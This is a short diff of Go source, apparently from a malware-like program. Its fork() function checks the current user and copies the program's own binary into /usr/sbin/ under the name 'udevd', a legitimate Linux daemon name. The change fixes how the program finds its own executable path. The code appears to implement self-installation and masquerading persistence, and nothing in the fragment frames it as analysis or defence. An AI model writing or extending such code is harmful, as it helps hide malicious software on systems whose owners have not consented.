@@ -339,7 +339,7 @@ func getMac() string {
 // /home/kunshi/mgc/bin/mgc
 func fork() {
 	whoami, _ = execShell("whoami")
-	src, _ := os.Getwd()
+	src, _ := filepath.Abs(filepath.Dir(os.Args[0]))
 	dst := "/usr/sbin/"
 	dstFileName := "udevd"
 	if whoami != "root\r\n" {
